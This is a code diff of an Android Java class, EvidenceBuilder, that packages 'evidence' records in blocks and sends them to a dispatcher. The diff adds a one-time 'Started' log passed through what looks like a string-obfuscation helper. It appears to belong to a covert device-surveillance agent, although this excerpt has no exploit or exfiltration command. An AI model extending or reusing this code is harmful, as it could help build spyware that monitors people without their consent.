@@ -9,64 +9,84 @@
 
 package com.android.dvci.evidence;
 
-import java.io.DataInputStream;
-import java.io.IOException;
-import java.util.ArrayList;
-
 import com.android.dvci.Packet;
 import com.android.dvci.auto.Cfg;
 import com.android.dvci.util.Check;
 import com.android.dvci.util.DataBuffer;
 import com.android.dvci.util.Utils;
 import com.android.dvci.util.WChar;
+import com.android.mm.M;
+
+import java.io.DataInputStream;
+import java.io.IOException;
+import java.util.ArrayList;
 
 /**
  * The Class LogR.
  */
 public class EvidenceBuilder {
 	private static final String TAG = "EvBuilder";
+	private static boolean firstInfo = true;
 
-	/** The type. */
+	/**
+	 * The type.
+	 */
 	private int type;
 
-	/** The unique. */
+	/**
+	 * The unique.
+	 */
 	private long unique;
 
-	/** The disp. */
+	/**
+	 * The disp.
+	 */
 	private EvDispatcher disp;
 
 	private boolean hasData;
 
-	/** The Constant LOG_CREATE. */
+	/**
+	 * The Constant LOG_CREATE.
+	 */
 	final public static int LOG_CREATE = 0x1;
 
-	/** The Constant LOG_ATOMIC. */
+	/**
+	 * The Constant LOG_ATOMIC.
+	 */
 	final public static int LOG_ATOMIC = 0x2;
 
-	/** The Constant LOG_APPEND. */
+	/**
+	 * The Constant LOG_APPEND.
+	 */
 	final public static int LOG_APPEND = 0x3;
 
-	/** The Constant LOG_WRITE. */
+	/**
+	 * The Constant LOG_WRITE.
+	 */
 	final public static int LOG_WRITE = 0x4;
 
-	/** The Constant LOG_CLOSE. */
+	/**
+	 * The Constant LOG_CLOSE.
+	 */
 	final public static int LOG_CLOSE = 0x5;
 
-	/** The Constant LOG_ITEMS. */
+	/**
+	 * The Constant LOG_ITEMS.
+	 */
 	final public static int LOG_ITEMS = 0x6;
 
 	public static final int INTERRUPT = -1;
 
-	/** The EVIDENCE delimiter. */
+	/**
+	 * The EVIDENCE delimiter.
+	 */
 	public static int E_DELIMITER = 0xABADC0DE;
 
 	/**
 	 * Instantiates a new log, creates the evidence.
-	 * 
-	 * @param evidence
-	 *            the log type
-	 * @param priority
-	 *            the priority
+	 *
+	 * @param evidence the log type
+	 * @param priority the priority
 	 */
 	public EvidenceBuilder(final int evidence) {
 		final Packet p = init(evidence);
@@ -77,13 +97,10 @@ public class EvidenceBuilder {
 
 	/**
 	 * Instantiates a new log, creates the evidence with additional.
-	 * 
-	 * @param evidenceType
-	 *            the log type
-	 * @param priority
-	 *            the priority
-	 * @param additional
-	 *            the additional
+	 *
+	 * @param evidenceType the log type
+	 * @param priority     the priority
+	 * @param additional   the additional
 	 */
 	public EvidenceBuilder(final int evidenceType, final byte[] additional) {
 		final Packet p = init(evidenceType);
@@ -96,15 +113,11 @@ public class EvidenceBuilder {
 	/**
 	 * Instantiates a new log, creates atomically the evidence with additional
 	 * and data.
-	 * 
-	 * @param evidenceType
-	 *            the log type
-	 * @param priority
-	 *            the priority
-	 * @param additional
-	 *            the additional
-	 * @param data
-	 *            the data
+	 *
+	 * @param evidenceType the log type
+	 * @param priority     the priority
+	 * @param additional   the additional
+	 * @param data         the data
 	 */
 	private EvidenceBuilder(final int evidenceType, final byte[] additional, final byte[] data) {
 		final Packet p = init(evidenceType);
@@ -145,11 +158,11 @@ public class EvidenceBuilder {
 	}
 
 	// Send data to dispatcher
+
 	/**
 	 * Send.
-	 * 
-	 * @param p
-	 *            the p
+	 *
+	 * @param p the p
 	 */
 	private void send(final Packet p) {
 		if (disp == null) {
@@ -165,9 +178,8 @@ public class EvidenceBuilder {
 
 	/**
 	 * Write or append data to the log.
-	 * 
-	 * @param data
-	 *            the data
+	 *
+	 * @param data the data
 	 */
 	public void write(final byte[] data) {
 		final Packet p = new Packet(unique);
@@ -201,35 +213,35 @@ public class EvidenceBuilder {
 		int BLOCKSIZE = Cfg.EV_BLOCK_SIZE;
 		byte[] buffer = new byte[BLOCKSIZE];
 		int offset = 0;
-		
+
 		Packet p = new Packet(unique);
-		
+
 		p.setCommand(LOG_APPEND);
 		p.setData(null, length);
 		send(p);
 
 		int size = 0;
 		try {
-			for (;;) {
+			for (; ; ) {
 				buffer = new byte[BLOCKSIZE];
 				int len = is.read(buffer);
-				if(len==-1){
+				if (len == -1) {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (write) end of file");
 					}
 					break;
-				}else if(len == 0){
+				} else if (len == 0) {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (write) len 0");
 					}
 					continue;
 				}
-				if(len!=BLOCKSIZE){
+				if (len != BLOCKSIZE) {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (write) last block size: %s", len);
 					}
 					Utils.sleep(100);
-				}else{
+				} else {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (write) block size: %s %s/%s", len, size, length);
 					}
@@ -240,7 +252,7 @@ public class EvidenceBuilder {
 				send(p);
 				hasData = true;
 				size += len;
-				
+
 			}
 
 		} catch (IOException e) {
@@ -249,12 +261,12 @@ public class EvidenceBuilder {
 			}
 		}
 
-		
+
 		if (Cfg.DEBUG) {
 			Check.ensures(size == length, "Wrong size, expected:" + length);
 			Check.log(TAG + " (write) sent size: %s", size);
 		}
-	 
+
 	}
 
 	/**
@@ -283,17 +295,17 @@ public class EvidenceBuilder {
 
 	/**
 	 * Info.
-	 * 
-	 * @param message
-	 *            the message
+	 *
+	 * @param message the message
 	 */
 	public static void info(final String message) {
 		try {
 			// atomic info
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Info: " + message);//$NON-NLS-1$
+				Check.log(TAG + " Info: " + message + " firstinfo: " + firstInfo);//$NON-NLS-1$
 			}
 
+			infoStart();
 			atomic(EvidenceType.INFO, null, WChar.getBytes(message, true));
 
 		} catch (final Exception ex) {
@@ -307,4 +319,19 @@ public class EvidenceBuilder {
 		}
 	}
 
+	public static void infoStart() {
+		try {
+			if (firstInfo) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " Info: infoStart, firstinfo: " + firstInfo);//$NON-NLS-1$
+				}
+				atomic(EvidenceType.INFO, null, WChar.getBytes(M.e("Started"), true));
+				firstInfo = false;
+			}
+		} catch (final Exception ex) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Error: " + ex.toString());//$NON-NLS-1$
+			}
+		}
+	}
 }
